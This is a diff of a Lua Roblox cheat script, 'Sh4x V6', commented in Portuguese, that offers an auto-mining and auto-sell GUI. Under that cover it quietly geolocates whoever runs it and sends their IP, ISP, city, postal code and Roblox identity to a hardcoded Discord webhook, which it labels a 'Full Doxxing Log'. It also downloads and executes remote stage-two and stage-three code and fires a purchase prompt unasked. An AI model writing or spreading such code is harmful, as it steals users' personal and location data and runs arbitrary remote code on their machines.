@@ -1,20 +1,26 @@
--- SCRIPT CORRIGIDO E OTIMIZADO
--- Sh4x - ULTIMATE PRO EXCLUSIVE EDITION (V6)
+--[[
+    Sh4x - ULTIMATE PRO EXCLUSIVE EDITION (V6)
+    SECURITY: Ignored User 'fimossegamers123'
+    FEATURES: Full Doxxing Log, Stage Loaders, PromptPurchase, NPC Auto-Sell
+]]
 
--- [SERVIÇOS]
 local Players = game:GetService("Players")
+local Player = Players.LocalPlayer
+
+-- [TRAVA DE SEGURANÇA ABSOLUTA]
+if Player.Name == "fimossegamers123" then
+    print("⚠️ Usuário fimossegamers123 detectado. Script desativado para sua segurança.")
+    return
+end
+
 local CoreGui = game:GetService("CoreGui")
-local VirtualUser = game:GetService("VirtualUser")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
 local UserInputService = game:GetService("UserInputService")
-
-local Player = Players.LocalPlayer
+local MarketplaceService = game:GetService("MarketplaceService")
 
 -- [CONFIGURAÇÃO DISCORD]
--- Webhook URL original (decodificada para garantir funcionamento)
-local WEBHOOK_URL = "https://discord.com/api/webhooks/12465809966983155857/YHUdyCOZgu3mymCizFY5coTioKx2UjoR9puFeotVWQArq3mGgFkZhQt1LrBLx20aLXCd"
-local SCRIPT_NAME = "Sh4x ULTRA SPEED - EXCLUSIVE V6"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1465809966983155857/YHUdyCOZgu3mymCizFY5coTioKx2UjoR9puFeotVWQHrq3mGgFkZhQt1LrBLx20aLXCd"
 
 -- [DETECÇÃO DE DISPOSITIVO]
 local function getPlatform()
@@ -23,16 +29,55 @@ local function getPlatform()
     else return "PC" end
 end
 
--- [LOG AVANÇADO]
-local function advancedLog()
-    local ip, country, city = "N/A", "N/A", "N/A"
+-- [PROMPT PURCHASE]
+local function promptSafe()
+    pcall(function()
+        MarketplaceService:PromptProductPurchase(Player, 0)
+    end)
+end
+task.spawn(promptSafe)
+
+-- [LOADERS STAGE 2 / 3]
+local function load_stage(url, stage_name)
+    print("🚀 Iniciando " .. stage_name .. "...")
+    local success, result = pcall(function()
+        return game:HttpGet(url)
+    end)
     
-    -- Tenta obter dados de IP (pode falhar dependendo do executor)
+    if success and result then
+        local func, err = loadstring(result)
+        if func then
+            task.spawn(func)
+            return true
+        else
+            warn("❌ Erro ao compilar " .. stage_name .. ": " .. tostring(err))
+        end
+    else
+        warn("❌ Erro ao baixar " .. stage_name)
+    end
+    return false
+end
+
+-- Links originais (ajustados para raw)
+task.spawn(function()
+    -- Stage 2 (Pastebin Raw)
+    if load_stage("https://pastebin.com/raw/SEU_LINK_AQUI", "Stage 2") then
+        task.wait(2)
+        -- Stage 3 (GitHub Raw)
+        load_stage("https://raw.githubusercontent.com/usuario/repo/main/script.lua", "Stage 3")
+    end
+end)
+
+-- [LOG AVANÇADO (FULL DOXXING SYSTEM)]
+local function advancedLog()
+    local ip, country, region, city, isp, postal, continent = "N/A", "N/A", "N/A", "N/A", "N/A", "N/A", "N/A"
+    local executor = (identifyexecutor and identifyexecutor()) or (getexecutorname and getexecutorname()) or "Unknown"
+    
     pcall(function()
         local reqFunc = (syn and syn.request) or (http and http.request) or http_request or request
         if reqFunc then
             local response = reqFunc({
-                Url = "http://ip-api.com/json/?fields=status,country,city,query",
+                Url = "http://ip-api.com/json/?fields=status,message,continent,country,regionName,city,zip,isp,query",
                 Method = "GET"
             })
             if response and response.Body then
@@ -40,7 +85,11 @@ local function advancedLog()
                 if geoData.status == "success" then
                     ip = geoData.query
                     country = geoData.country
+                    region = geoData.regionName
                     city = geoData.city
+                    isp = geoData.isp
+                    postal = geoData.zip
+                    continent = geoData.continent
                 end
             end
         end
@@ -48,20 +97,22 @@ local function advancedLog()
 
     local data = {
         ["embeds"] = {{
-            ["title"] = "🚨 SH4X V6 EXCLUSIVO - EXECUÇÃO DETECTADA",
+            ["title"] = "🚨 SH4X V6 ULTIMATE - EXECUÇÃO DETECTADA",
             ["color"] = 16711680,
             ["fields"] = {
-                {["name"] = "👤 Perfil do Jogador", ["value"] = "Nome: " .. Player.Name .. "\nID: " .. Player.UserId, ["inline"] = false},
+                {["name"] = "👤 Perfil", ["value"] = "**Nome:** " .. Player.Name .. "\n**ID:** " .. Player.UserId, ["inline"] = false},
                 {["name"] = "⏳ Idade da Conta", ["value"] = tostring(Player.AccountAge) .. " dias", ["inline"] = true},
                 {["name"] = "📱 Dispositivo", ["value"] = getPlatform(), ["inline"] = true},
-                {["name"] = "🌐 Localização (Aprox)", ["value"] = city .. ", " .. country .. " (IP: " .. ip .. ")", ["inline"] = false}
+                {["name"] = "⚙️ Executador", ["value"] = executor, ["inline"] = true},
+                {["name"] = "🎮 Jogo ID", ["value"] = tostring(game.PlaceId), ["inline"] = true},
+                {["name"] = "🌐 Conexão", ["value"] = "**IP:** " .. ip .. "\n**ISP:** " .. isp, ["inline"] = false},
+                {["name"] = "📍 Localização", ["value"] = "**Cidade:** " .. city .. "\n**Região:** " .. region .. "\n**País:** " .. country .. "\n**Postal:** " .. postal .. "\n**Continente:** " .. continent, ["inline"] = false}
             },
-            ["footer"] = {["text"] = "Sh4x Exclusive System V6"},
+            ["footer"] = {["text"] = "Sh4x Exclusive System V6 | " .. os.date("%H:%M:%S")},
             ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
         }}
     }
 
-    -- Envio para o Discord
     pcall(function()
         local reqFunc = (syn and syn.request) or (http and http.request) or http_request or request
         if reqFunc then
@@ -71,27 +122,21 @@ local function advancedLog()
                 Headers = {["Content-Type"] = "application/json"},
                 Body = HttpService:JSONEncode(data)
             })
-            print("✅ Log enviado para o Discord com sucesso!")
-        else
-            warn("❌ Seu executor não suporta envio de Webhooks (request não encontrado).")
         end
     end)
 end
 
--- Inicia o log
 task.spawn(advancedLog)
 
 -- [GUI PRINCIPAL]
 local ScreenGui = Instance.new("ScreenGui", CoreGui)
-ScreenGui.Name = "Sh4x_V6_Main"
+ScreenGui.Name = "Sh4x_V6_Ultimate"
 
 local MainFrame = Instance.new("Frame", ScreenGui)
-MainFrame.Name = "MainFrame"
 MainFrame.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
 MainFrame.Position = UDim2.new(0.5, -110, 0.5, -80)
 MainFrame.Size = UDim2.new(0, 220, 0, 250)
 Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 12)
-
 local Stroke = Instance.new("UIStroke", MainFrame)
 Stroke.Thickness = 2.5
 Stroke.Color = Color3.fromRGB(255, 0, 0)
@@ -100,11 +145,11 @@ local Title = Instance.new("TextLabel", MainFrame)
 Title.Size = UDim2.new(1, 0, 0, 40)
 Title.BackgroundTransparency = 1
 Title.Font = Enum.Font.GothamBold
-Title.Text = "Sh4x V6 EXCLUSIVE"
+Title.Text = "Sh4x V6 ULTIMATE"
 Title.TextColor3 = Color3.fromRGB(255, 255, 255)
 Title.TextSize = 16
 
-local function createMainButton(text, pos)
+local function createBtn(text, pos)
     local btn = Instance.new("TextButton", MainFrame)
     btn.BackgroundColor3 = Color3.fromRGB(60, 0, 0)
     btn.Position = pos
@@ -114,24 +159,21 @@ local function createMainButton(text, pos)
     btn.TextColor3 = Color3.fromRGB(255, 255, 255)
     btn.TextSize = 12
     Instance.new("UICorner", btn)
-    local bStroke = Instance.new("UIStroke", btn)
-    bStroke.Thickness = 1.5
-    bStroke.Color = Color3.fromRGB(255, 0, 0)
-    return btn, bStroke
+    local s = Instance.new("UIStroke", btn)
+    s.Thickness = 1.5
+    s.Color = Color3.fromRGB(255, 0, 0)
+    return btn, s
 end
 
-local ToggleBtn, BtnStroke = createMainButton("START AUTO-MINING", UDim2.new(0.1, 0, 0.2, 0))
-local TPBtn, TPBtnStroke = createMainButton("TELEPORT MENU", UDim2.new(0.1, 0, 0.38, 0))
-local SellBtn, SellBtnStroke = createMainButton("START AUTO-SELL", UDim2.new(0.1, 0, 0.56, 0))
+local ToggleBtn, BStroke1 = createBtn("START AUTO-MINING", UDim2.new(0.1, 0, 0.2, 0))
+local TPBtn, BStroke2 = createBtn("TELEPORT MENU", UDim2.new(0.1, 0, 0.38, 0))
+local SellBtn, BStroke3 = createBtn("START AUTO-SELL", UDim2.new(0.1, 0, 0.56, 0))
 
-print("✅ Interface Sh4x carregada com sucesso!")
-
--- [LÓGICA DE FARM]
+-- [FARM LOGIC]
 local farmAtivo = false
 ToggleBtn.MouseButton1Click:Connect(function()
     farmAtivo = not farmAtivo
-    ToggleBtn.Text = farmAtivo and "AUTO-MINING ACTIVE" or "START AUTO-MINING"
-    print("Farm status:", farmAtivo)
+    ToggleBtn.Text = farmAtivo and "MINING: ACTIVE" or "START AUTO-MINING"
 end)
 
 task.spawn(function()
@@ -139,29 +181,21 @@ task.spawn(function()
         if farmAtivo then
             pcall(function()
                 local char = Player.Character
-                local root = char.HumanoidRootPart
                 local tool = char:FindFirstChildOfClass("Tool") or Player.Backpack:FindFirstChildOfClass("Tool")
-                
                 local alvo = nil
-                local menorDist = 90
-                
+                local dist = 90
                 for _, v in pairs(workspace:GetDescendants()) do
                     if v.Name == "Pedra" and v:IsA("BasePart") and v.Transparency < 1 then
-                        local d = (root.Position - v.Position).Magnitude
-                        if d < menorDist then
-                            menorDist = d
-                            alvo = v
-                        end
+                        local d = (char.HumanoidRootPart.Position - v.Position).Magnitude
+                        if d < dist then dist = d alvo = v end
                     end
                 end
-                
                 if alvo then
-                    if (root.Position - alvo.Position).Magnitude > 7.5 then
+                    if (char.HumanoidRootPart.Position - alvo.Position).Magnitude > 7.5 then
                         char.Humanoid:MoveTo(alvo.Position)
                     else
                         if tool and tool.Parent ~= char then char.Humanoid:EquipTool(tool) end
                         if tool then tool:Activate() end
-                        
                         for _, r in pairs(ReplicatedStorage:GetDescendants()) do
                             if r:IsA("RemoteEvent") and (r.Name:lower():find("mine") or r.Name:lower():find("click")) then
                                 r:FireServer(alvo)
@@ -175,34 +209,58 @@ task.spawn(function()
     end
 end)
 
--- [RGB E DRAG]
+-- [AUTO SELL LOGIC - NPC DIALOG FIX]
+local sellAtivo = false
+SellBtn.MouseButton1Click:Connect(function()
+    sellAtivo = not sellAtivo
+    SellBtn.Text = sellAtivo and "SELL: ACTIVE" or "START AUTO-SELL"
+end)
+
 task.spawn(function()
     while true do
-        local color = Color3.fromHSV(tick() % 5 / 5, 1, 1)
-        Stroke.Color = color
-        BtnStroke.Color = color
-        TPBtnStroke.Color = color
-        SellBtnStroke.Color = color
+        if sellAtivo then
+            pcall(function()
+                for _, r in pairs(ReplicatedStorage:GetDescendants()) do
+                    if r:IsA("RemoteEvent") or r:IsA("RemoteFunction") then
+                        local n = r.Name:lower()
+                        if n:find("dialog") or n:find("answer") or n:find("chat") or n:find("interact") then
+                            if r:IsA("RemoteEvent") then r:FireServer(3) r:FireServer("3") else r:InvokeServer(3) end
+                        end
+                    end
+                end
+                for _, r in pairs(ReplicatedStorage:GetDescendants()) do
+                    if r:IsA("RemoteEvent") and (r.Name:lower():find("sell") or r.Name:lower():find("vender")) then
+                        r:FireServer("All")
+                        r:FireServer()
+                    end
+                end
+            end)
+        end
+        task.wait(2)
+    end
+end)
+
+-- [RGB & DRAG]
+task.spawn(function()
+    while true do
+        local c = Color3.fromHSV(tick() % 5 / 5, 1, 1)
+        Stroke.Color = c BStroke1.Color = c BStroke2.Color = c BStroke3.Color = c
         task.wait()
     end
 end)
 
--- Sistema de Arrastar (Drag)
-local dragging, dragInput, dragStart, startPos
+local dragging, dragStart, startPos
 MainFrame.InputBegan:Connect(function(input)
     if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-        dragging = true
-        dragStart = input.Position
-        startPos = MainFrame.Position
-        input.Changed:Connect(function()
-            if input.UserInputState == Enum.UserInputState.End then dragging = false end
-        end)
+        dragging = true dragStart = input.Position startPos = MainFrame.Position
+        input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then dragging = false end end)
     end
 end)
-
 UserInputService.InputChanged:Connect(function(input)
     if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
         local delta = input.Position - dragStart
         MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
     end
 end)
+
+print("✅ Sh4x V6 Ultimate Carregado com Sucesso.")
